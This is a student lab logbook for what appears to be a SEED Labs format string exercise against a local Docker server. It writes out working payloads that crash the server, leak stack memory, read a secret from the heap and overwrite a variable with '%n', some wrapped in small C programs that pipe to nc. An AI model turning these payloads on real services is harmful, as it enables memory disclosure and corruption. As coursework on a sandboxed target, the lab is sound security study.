# Logbook 7

## Environment Setup

In an initial phase, we disabled address randomization because it is important for this attack to discover the location and order of program addresses.

```bash
$ sudo sysctl -w kernel.randomize_va_space=0
```

Then we opened two terminals, one with the servers using Docker from seed-labs, and another (the client) to communicate with the servers. This allowed us to see the messages exchanged on both sides. When sending a string to the server using the command:

```bash
$ echo 'hello' | nc 10.9.0.5 9090
```

The server returns some addresses needed for the following tasks:

- address of the input buffer
- address of the secret message
- frame pointer of the myprintf function
- the initial and final address of a target variable

The program.c, which is the program running on the server, was compiled using the `-z execstack` flag because it allows code inside the stack to be executed.

## Task 1

To crash the server, it was enough to insert the following input string:

```bash
$ echo '%s' | nc 10.9.0.5 9090
```

The format string retrieves the address immediately above its position on the stack and tries to print the string at that address. This likely falls into a zone outside the process's virtual memory.

Since there was no `Returned properly` message on the server side, the server crashed.

## Task 2

### Task 2.A

To print the first 4 bytes of the input from the format string, it is necessary for the input to contain a known value for easier identification. In our case, we will use "ABCD," which in hexadecimal is "41424344."

The initial idea is to input "ABCD" concatenated with various "%08x".

```bash
echo "ABCD%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X" | nc 10.9.0.5 9090
```

In the server output, we observed:

```note
ABCD112233440000100008049DB5080E5320080E61C0FFFFD1A0FFFFD0C8080E62D4080E5000FFFFD16808049F7EFFFFD1A0000000000000006408049F47080E5320000004D7FFFFD2A5FFFFD1A0080E5320080E97200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000052488F00080E5000080E5000FFFFD78808049EFFFFFFD1A000000105000005DC080E5320000000000000000000000000FFFFD8540000000000000000000000000000010544434241...
```

The final "44434241" is the address of the "ABCD" string given as input. Note that the constituent bytes are reversed.

Between "ABCD" and "44434241," there are 504 characters, and since each address consists of 8 characters (32-bit addresses), there are 504/8 = 63 addresses on the stack between the format string and the buffer.

It is concluded that in this program configuration, to print the first 4 bytes of the initial input, it is necessary to create a string with exactly 64 "%x": the first 63 to display the intermediate addresses and the last one to display the initial 32 bits (4 bytes) of the input.

### Task 2.B

In this task, we need to print the content of a string present in the Heap at the address 0x080b4008. Since the program to be executed on the server is the same as in the previous task, we will use the same principles.

The address 0x080b4008 can be encoded as a string "\x08\x0b\x40\x08." By placing this address at the beginning of the input followed by 63 "%08x" and one "%s," the format string will read from this address and return the hidden value.
The executed code was as follows:

```c
#include <string.h>
#include <stdlib.h>

int main() {
    char cmd[296] = "echo \x08\x40\x0b\x08%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X %s | nc 10.9.0.5 9090";
    
    system(cmd);
    return 0;
}
```

The server output was:

![Alt text](/images/Logbook7-1.png)

We concluded that the message at the address is `"A secret message"`.

## Task 3

### Task 3.A

In this task, we need to change the value of the `target` variable. Initially, its value is 0x11223344, and the address is 0x080e5068.

The `%n` command in format strings writes to the memory zone of the argument passed as a parameter the number of characters written up to that point. The approach is very similar to the command in Task 2.B, except that instead of reading from the selected address, we will write.
The executed code was:

```c
#include <string.h>
#include <stdlib.h>

int main() {
    char cmd[296] = "echo \x68\x50\x0e\x08%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X %n | nc 10.9.0.5 9090";
    
    system(cmd);
    return 0;
}
```

The server output was:

![Alt text](/images/Logbook7-2.png)

### Task 3.B

This time, the value of `target` should be changed to a specific value: 0x5000, or 20480 in decimal. Since we know that '%n' will write the number of characters written up to that point, then the input until '%n' must have 20480 characters. As the input is large, we use the notation `%.NX`, with N = 20480 - 4 - 63*8 = 19980, to write the remaining 19980 with the value 0.

```c
#include <string.h>
#include <stdlib.h>

int main() {
    char cmd[] = "echo \x68\x50\x0e\x08%.19980X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%08X%n | nc 10.9.0.5 9090";

    system(cmd);
    return 0;
}
```

It resulted in the following output on the server:

![Alt text](/images/Logbook7-3.png)
![Alt text](/images/Logbook7-4.png)

As observed, the value of `target` is now 0x00005000.
